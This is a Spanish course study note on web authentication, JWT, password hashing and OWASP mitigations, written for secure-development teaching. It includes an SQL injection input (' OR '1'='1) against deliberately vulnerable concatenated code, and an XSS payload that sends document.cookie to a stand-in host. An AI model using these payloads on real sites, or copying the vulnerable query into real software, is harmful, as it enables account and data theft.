---
tags: [clase, electiva]
materia: Desarrollo de Aplicaciones Web
fuente: "conocimiento general"
---
# DAW 06 - Autenticación y seguridad web

Materia: [[Desarrollo de Aplicaciones Web]]
Anterior: [[DAW 05 - Persistencia SQL, NoSQL y ORM]]
Siguiente: [[DAW 07 - Despliegue, Git, Docker y CI-CD]]

## Contexto y objetivo
Una aplicación expuesta a internet será atacada. Objetivo: implementar autenticación (quién eres) y autorización (qué puedes hacer), y reconocer y mitigar las vulnerabilidades más comunes del OWASP Top 10: inyección SQL, XSS y CSRF.

## Teoría

### Autenticación
- **Contraseñas**: nunca en texto plano ni con hash rápido (MD5, SHA-1). Usar algoritmos lentos con sal: **bcrypt, scrypt, Argon2**.
- **Sesiones**: el servidor guarda estado y entrega un ID en una cookie `HttpOnly; Secure; SameSite`.
- **JWT** (JSON Web Token): token firmado `cabecera.carga.firma` en base64url. No cifra la carga: no poner secretos dentro. Tiene expiración (`exp`); la revocación es difícil, por eso se usan tokens de acceso cortos más *refresh token*.
- **OAuth 2.0 / OpenID Connect**: delegar la identidad a un proveedor (Google, etc.). Multifactor (TOTP).

### Autorización
Control por roles (RBAC) o por atributos; comprobar en el servidor y en cada petición, también la **propiedad del recurso** (evita IDOR: acceder a `/pedidos/8` ajeno).

### OWASP Top 10 (selección)
| Riesgo | Mitigación |
|---|---|
| Control de acceso roto | Verificar permisos en el servidor, denegar por defecto |
| Fallas criptográficas | HTTPS, hash de contraseñas, no inventar cifrado |
| Inyección (SQL, comandos) | Consultas parametrizadas, validación |
| Diseño inseguro / configuración | Mínimo privilegio, cabeceras, no exponer depuración |
| Componentes vulnerables | Actualizar dependencias, `npm audit`, `pip-audit` |
| Fallas de autenticación | Límite de intentos, MFA |
| XSS | Escapar salida, CSP, `textContent` |
| CSRF | Token anti-CSRF, cookies `SameSite` |

### CORS
Política del navegador, no de seguridad del servidor: restringir orígenes permitidos; nunca `*` con credenciales.

## Ejemplo resuelto
1. **Inyección SQL**. Código vulnerable y su arreglo:
```python
# VULNERABLE: la entrada se concatena
nombre = request.args["nombre"]          # ' OR '1'='1
cur.execute("SELECT * FROM usuario WHERE nombre = '" + nombre + "'")

# CORRECTO: parámetro enlazado
cur.execute("SELECT * FROM usuario WHERE nombre = %s", (nombre,))
```
Con la entrada `' OR '1'='1` el primer caso devuelve todos los usuarios; el segundo trata la entrada como dato.

2. **XSS**. Un comentario `<script>fetch('//malo/'+document.cookie)</script>` insertado con `innerHTML` se ejecuta. Arreglo: `elemento.textContent = comentario` y cabecera `Content-Security-Policy: default-src 'self'`.

3. **Registro e inicio de sesión con JWT** en FastAPI:
```python
# pip install fastapi "passlib[argon2]" pyjwt
import os, datetime as dt
import jwt
from fastapi import Depends, FastAPI, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from passlib.hash import argon2

SECRETO = os.environ["JWT_SECRET"]       # nunca en el código
app = FastAPI()
usuarios = {}                             # demo; en producción, base de datos
bearer = HTTPBearer()

@app.post("/registro", status_code=201)
def registro(correo: str, clave: str):
    if len(clave) < 12:
        raise HTTPException(422, "Clave demasiado corta")
    usuarios[correo] = {"hash": argon2.hash(clave), "rol": "usuario"}
    return {"ok": True}

@app.post("/login")
def login(correo: str, clave: str):
    u = usuarios.get(correo)
    if not u or not argon2.verify(clave, u["hash"]):
        raise HTTPException(401, "Credenciales inválidas")  # mensaje genérico
    carga = {"sub": correo, "rol": u["rol"],
             "exp": dt.datetime.now(dt.timezone.utc) + dt.timedelta(minutes=15)}
    return {"token": jwt.encode(carga, SECRETO, algorithm="HS256")}

def actual(cred: HTTPAuthorizationCredentials = Depends(bearer)):
    try:
        return jwt.decode(cred.credentials, SECRETO, algorithms=["HS256"])
    except jwt.PyJWTError:
        raise HTTPException(401, "Token inválido o vencido")

@app.get("/perfil")
def perfil(usr=Depends(actual)):
    return {"correo": usr["sub"], "rol": usr["rol"]}
```
Pasos: la clave se guarda con Argon2 (sal incluida); el login responde igual si falla el correo o la clave; el token dura 15 minutos y se envía en `Authorization: Bearer ...`; `algorithms=["HS256"]` evita ataques de confusión de algoritmo.

4. **CSRF** con sesiones por cookie: configurar `Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax` y exigir un token en formularios que cambian estado.

Cabeceras útiles: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`.

## Errores comunes
- Guardar contraseñas con SHA-256 sin sal ni costo.
- JWT en `localStorage` (robable por XSS); preferir cookie `HttpOnly`.
- Validar solo en el cliente.
- Mensajes distintos para "usuario no existe" y "clave incorrecta".
- Llaves y secretos en el repositorio.

## Ejercicios propuestos
1. ¿Por qué un JWT no sirve para guardar un número de tarjeta? *Respuesta: la carga solo está firmada, no cifrada; cualquiera la decodifica.*
2. ¿Cómo se previene un IDOR? *Respuesta: comprobar en el servidor que el recurso pertenece al usuario autenticado.*
3. Reescribe `"DELETE FROM t WHERE id=" + id` de forma segura. *Respuesta: `cur.execute("DELETE FROM t WHERE id = %s", (id,))` y validar que id sea entero.*

## Conexiones
[[Sistemas Operativos]] (usuarios, permisos), [[Administración de Redes]] (TLS, firewalls, WAF), [[Base de Datos II]] (seguridad de bases de datos), [[Ingeniería de Software]] (desarrollo seguro).

## Fuente
Conocimiento general: OWASP Top 10 y Cheat Sheets, RFC 7519 (JWT), documentación de FastAPI. Verificar con el programa oficial el énfasis del curso.
